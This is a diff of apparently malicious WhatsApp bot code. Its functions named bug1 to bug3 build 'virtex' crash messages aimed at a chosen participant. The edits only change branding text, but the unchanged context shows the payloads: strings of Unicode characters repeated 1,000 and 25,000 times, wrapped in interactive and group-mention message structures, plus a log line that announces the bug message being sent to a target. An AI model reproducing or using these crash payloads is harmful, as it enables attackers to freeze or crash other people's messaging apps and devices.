@@ -80,7 +80,7 @@ async function bug1(message, client, participant) {
                                 hasMediaAttachment: true
                             },
                             body: {
-                                text: `⿻𝙾𝚋𝚒𝚝𝚘 love you\n${"ꦾ".repeat(1000)}\n\n`
+                                text: `⿻Obito love you\n${"ꦾ".repeat(1000)}\n\n`
                             },
                             nativeFlowMessage: {
 
@@ -138,7 +138,7 @@ async function bug2(message, client, participant) {
 
         console.log(`Sending bug2 message to: ${participant}`);
 
-        const virtex = "𝙾𝚋𝚒𝚝𝚘 love you" + "ြ".repeat(25000);
+        const virtex = "Obito love you" + "ြ".repeat(25000);
 
         const msgPayload = {
             groupMentionedMessage: {
@@ -158,7 +158,7 @@ async function bug2(message, client, participant) {
                                 mediaKeyTimestamp: "1715880173",
                                 contactVcard: true
                             },
-                            title: "𝙻𝚘𝚛𝚍 𝙾𝚋𝚒𝚝𝚘",
+                            title: "Lord obito",
                             hasMediaAttachment: true
                         },
                         body: {
@@ -206,7 +206,7 @@ async function bug3(message, client, participant){
 
                             body: {
 
-                                text: "༒ 𝙻𝚘𝚛𝚍_𝙾𝚋𝚒𝚝𝚘 ༒",
+                                text: "༒ Lord Obito ༒",
 
                                 format: "EXTENSIONS_1"
                             },
